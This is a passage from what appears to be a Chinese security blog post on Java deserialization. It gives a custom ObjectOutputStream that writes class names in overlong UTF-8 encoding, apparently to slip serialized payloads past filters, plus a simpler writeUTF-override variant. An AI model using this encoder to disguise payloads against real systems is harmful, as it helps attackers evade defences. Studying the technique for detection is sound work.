bytesMap.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x99</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaa</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xab</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xac</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xad</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaf</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb0</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xba</span>&#125;);<br><br>    &#125;<br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWritTwoBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//将name进行overlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">2</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = map.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">2</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWriteThreeBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//将name进行overlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">3</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = bytesMap.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">2</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">2</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">3</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeClassDescriptor</span><span class="hljs-params">(ObjectStreamClass desc)</span><br>            <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> desc.getName();<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">externalizable</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;externalizable&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">serializable</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;serializable&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">hasWriteObjectData</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;hasWriteObjectData&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">isEnum</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;isEnum&quot;</span>);<br>        ObjectStreamField[] fields = (ObjectStreamField[]) getFieldValue(desc, <span class="hljs-string">&quot;fields&quot;</span>);<br>        System.out.println(name);<br>        <span class="hljs-comment">//写入name（jdk原生写入方法）</span><br><span class="hljs-comment">//        writeUTF(name);</span><br>        <span class="hljs-comment">//写入name(两个字节表示一个字符)</span><br><span class="hljs-comment">//        charWritTwoBytes(name);</span><br>        <span class="hljs-comment">//写入name(三个字节表示一个字符)</span><br>        charWriteThreeBytes(name);<br><br><br>        writeLong(desc.getSerialVersionUID());<br>        <span class="hljs-type">byte</span> <span class="hljs-variable">flags</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (externalizable) &#123;<br>            flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">protocolField</span> <span class="hljs-operator">=</span><br>                    <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">int</span> protocol;<br>            <span class="hljs-keyword">try</span> &#123;<br>                protocolField = ObjectOutputStream.class.getDeclaredField(<span class="hljs-string">&quot;protocol&quot;</span>);<br>                protocolField.setAccessible(<span class="hljs-literal">true</span>);<br>                protocol = (<span class="hljs-type">int</span>) protocolField.get(<span class="hljs-built_in">this</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;<br>                flags |= ObjectStreamConstants.SC_BLOCK_DATA;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (serializable) &#123;<br>            flags |= ObjectStreamConstants.SC_SERIALIZABLE;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (hasWriteObjectData) &#123;<br>            flags |= ObjectStreamConstants.SC_WRITE_METHOD;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (isEnum) &#123;<br>            flags |= ObjectStreamConstants.SC_ENUM;<br>        &#125;<br>        writeByte(flags);<br><br>        writeShort(fields.length);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; fields.length; i++) &#123;<br>            <span class="hljs-type">ObjectStreamField</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> fields[i];<br>            writeByte(f.getTypeCode());<br>            writeUTF(f.getName());<br>            <span class="hljs-keyword">if</span> (!f.isPrimitive()) &#123;<br>                invoke(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;writeTypeString&quot;</span>, f.getTypeString());<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object object, String methodName, Object... args)</span> &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">writeTypeString</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeTypeString = ObjectOutputStream.class.getDeclaredMethod(methodName, String.class);<br>            writeTypeString.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">try</span> &#123;<br>                writeTypeString.invoke(object, args);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object object, String fieldName)</span> &#123;<br>        Class&lt;?&gt; clazz = object.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            value = field.get(object);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>文章评论区还提到了，可以直接重写writeUTF方法会更加简单，修改一下变成这样</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UTF8OutputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectOutputStream</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UTF8OutputStream</span><span class="hljs-params">(OutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(out);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">UTF8OutputStream</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, SecurityException &#123;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> HashMap&lt;Character, <span class="hljs-type">int</span>[]&gt; map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;Character,<span class="hljs-type">int</span>[]&gt; bytesMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xbb</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaa</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xab</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xac</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xad</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb0</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xba</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x81</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x82</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x83</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x84</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x85</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x86</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x87</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x88</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x89</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8a</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8c</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8e</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8f</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;P&#x27;</span>, 